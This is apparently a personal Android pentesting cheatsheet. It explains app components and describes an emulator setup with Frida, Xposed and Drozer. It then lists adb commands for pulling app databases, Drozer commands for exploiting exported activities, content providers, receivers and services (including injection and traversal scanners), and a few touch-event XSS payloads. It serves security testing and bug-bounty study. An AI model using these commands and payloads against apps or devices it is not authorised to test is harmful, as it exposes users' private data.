---
title: Android Pentesting Cheatsheet
tags: [Bug Bounty,Androi,Mobile Hacking,Cheatsheet]
published: false
description: A place for me to store my notes/tricks for Android Pentesting and all things mobile - Big Work in Progress :). 
toc: true
image: https://www.stickpng.com/assets/images/580b57fbd9996e24bc43bdf2.png
thumbnail: https://www.stickpng.com/assets/images/580b57fbd9996e24bc43bdf2.png
---



This is a massive WIP and truthfully I was planning on keeping this a private post as I am really just braindumping my techniques on here not really ordered or structured but I figured it may be useful to other people.

<img src="https://www.stickpng.com/assets/images/580b57fbd9996e24bc43bdf2.png">


Also before I continue these are my main references that have helped me build my own methodology.

* https://manifestsecurity.com/android-application-security-part-1/


# []() Introduction



Let me first say I do not think this will end up a crazy big cheat sheet to my other ones but I am at a point where I need to dump all this knowledge, commands and techniques somewhere before I forget them all. 

I want to first talk about the basic Android Stuff from File Structure, File Format and finally things such as Activities,Controls, Services, Intents & Exported Items etc and how these can be security issues when misconfigured. 



## []() Android Basics


I am no expert on Android internals but I believe I have a decent idea of how it's all pieced together enough to exploit and pentest but I am no developer...

Android Apps are all based off the popular Java programming language which are all compiled into files called `apks` aka an `Android Package` which is essential just an archive file similar to a `.zip` archive. 

A single APK file contains all the contents of an Android App and typically contains everything it requires to run unless the developer is downloading assets at runtime etc. 

ManifestSecurity have a nice diagram representing the file layout

<img src ="https://i.imgur.com/AS6V70w.png">

Within the `apk` file there are certain important files which contribute to the overall APK. 

**AndroidManifest.xml** - One of the most important files of an app, The AndroidManfest is the main file which tells the system/app what to do with all the top-level components such as activities, services, content providers and broadcast recievers etc. (This is where the misconfigurations happen)

**/res** - DIrectory containing all resources not compiled into `resources.rec`


## Android Components

Here I will now talk about the 4 main components which make up an application and c an be exploited if not configured correctly - `Acitivies` `Content-Providers``Services` and `Broadcast Recievers`

These components are activated by an "asynchronous message called an intent" - you may have heard the term `intent-filter` 

Intents also bind together components at runtime.

### Activities

An activity represents a single screen with a user interface which carries out a action, such as a activity for login and a activity for after you have logged in and you are at the main interface. 

### Content Providers

A content providers main task is to supply data from one application to another on request, for example you can store data on the local file system within `/data/data/com.m0chan.app/` and through your exported content provider another app could access this directory and/or the data it holds.

It goes without saying that if this isn't configured with proper limitations and permissions there could be a severe security issue. 

These are particuarly useful when apps want to access the data of other apps. 

### Services

Services are components of an app that may want to run in the background for a prolonged period of time. 

An example of a service may be an application such as Soundcloud which allows for music to be played in the background while you are actively accessing the Facebook app. 

### Broadcast Recievers 

A broadcast reciever is a component which responsd to system-wide broadcast annoucements.

Most apps are mainly system iniaited however apps can also iniate them, for example to let other apps know a download has finished etc.

An application may register a receiver for the low battery message for example, and change its behavior based on that information.


### [](#header-2) Setup

I planned on writing a mini tutorial here on setting up a awesome Android Pentesting Emulator but I recently binned it and moved to GenyMotion which is 100x better. 

Below are some useful links to get you started, my current setup consists of the below.

* GenyMotion Android 8.0 Emulator
* xPosed Installed
* BagiPro Recommends SSLUnpinning Module from xPosed
* Frida Installed
* Drozer Installed


The great thing about GenyMotion is the emulators come rooted and the platform is entirely free for personal use. Sadly there is no iOS support (yet)

* https://www.genymotion.com/


### [](#header-2) Static Analysis



### [](#header-2) Dynamic Analysis

#### File System Analysis


```
cd /data/data/com.package.name
ls -lrt
```

#### Database Analysis

Applications typically store data within `/data/data/com.package.name/sqlite.db` within a relevant SQLite database. This can sometimes store sensitive data and should not be used to store usernames/passwords etc.

```
adb pull /data/data/com.package.name/databases/databasename.db ~/databasename.db
```


#### Log Analysis

```
adb logcat
```





### Drozer Stuff

* [Drozer](https://github.com/FSecureLABS/drozer) - Drozer allows you to search for security vulnerabilities in apps and devices by assuming the role of an app and interacting with the Dalvik VM, other apps' IPC endpoints and the underlying OS.
    * Starting a session
      * `adb forward tcp:31415 tcp:31415`
      * `drozer console connect`
    * Retrieving package information
      * `run app.package.list -f <app name>`
      * `run app.package.info -a <package name>`
    * Identifying the attack surface
      * `run app.package.attacksurface <package name>`
    * Exploiting Activities
      * `run app.activity.info -a <package name> -u`
      * `run app.activity.start --component <package name> <component name>`
    * Exploiting Content Provider
      * `run app.provider.info -a <package name>`
      * `run scanner.provider.finduris -a <package name>`
      * `run app.provider.query <uri>`
      * `run app.provider.update <uri> --selection <conditions> <selection arg> <column> <data>`
      * `run scanner.provider.sqltables -a <package name>`
      * `run scanner.provider.injection -a <package name>`
      * `run scanner.provider.traversal -a <package name>`
    * Exploiting Broadcast Receivers
      * `run app.broadcast.info -a <package name>`
      * `run app.broadcast.send --component <package name> <component name> --extra <type> <key> <value>`
      * `run app.broadcast.sniff --action <action>`
    * Exploiting Service
      * `run app.service.info -a <package name>`
      * `run app.service.start --action <action> --component <package name> <component name>`
      * `run app.service.send <package name> <component name> --msg <what> <arg1> <arg2> --extra <type> <key> <value> --bundle-as-obj`

### Android XSS Payloads


```powershell
<html ontouchstart=alert(1)>
<html ontouchend=alert(1)>
<html ontouchmove=alert(1)>
<html ontouchcancel=alert(1)>
<body onorientationchange=alert(1)>
<svg onload=alert(navigator.connection.type)>
```